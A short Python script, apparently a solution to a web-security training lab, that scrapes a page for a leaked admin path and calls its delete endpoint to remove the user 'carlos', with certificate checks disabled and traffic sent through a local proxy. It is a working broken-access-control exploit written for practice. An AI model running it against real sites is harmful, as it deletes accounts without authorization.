import requests #allows us to perform http requests
import sys #allows to get stuff from the command line
import urllib3 #simplifies HTTP interactions
from bs4 import BeautifulSoup
import re #RegEx Module or regular expression

#suppress certificate warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#setting proxy settings
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

#function for deleting user
def delete_user(url):
    
    r = requests.get(url, verify=False, proxies=proxies)
    
    #Retrieve session cookies
    session_cookie = r.cookies.get_dict().get('session') #get dic of cookies and from that get cookie named session

    soup = BeautifulSoup(r.text, 'lxml')
    #find all the instances in the application that have a string admin- in it
    admin_instances = soup.find(string = re.compile("/admin-"))
    print(admin_instances)
    admin_path = re.search("href', '(.*)'", admin_instances).group(1)
    # print(admin_path)
    
    #Delete carlos
    cookies = {"session": session_cookie}
    delete_carlos_url = url + admin_path + '/delete?username=carlos'
    
    print("delete url: " + delete_carlos_url)
    r = requests.get(delete_carlos_url, cookies = cookies, verify= False, proxies=proxies)
    
    if r.status_code == 200:
        print ('(+) carlos user deleted')
    
    else:
        print('(+) Deletion failed')
        print('(+) Exiting script....')
        sys.exit(-1)


#sys.argv is a list, which contains command line arguments
#sys.argv[0] is the name of the script
#sys.argv[1] is the first argument passes to the script
#This is arguments passed =2 ie. script name and url
def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.xom" % sys.argv[0]) 
        sys.exit(-1)
        
    url = sys.argv[1] #sys.argv[1] is the first argument passes to the script
    print("(+) Deleting carlos user.....")
    delete_user(url)



if __name__ == "__main__":
    main()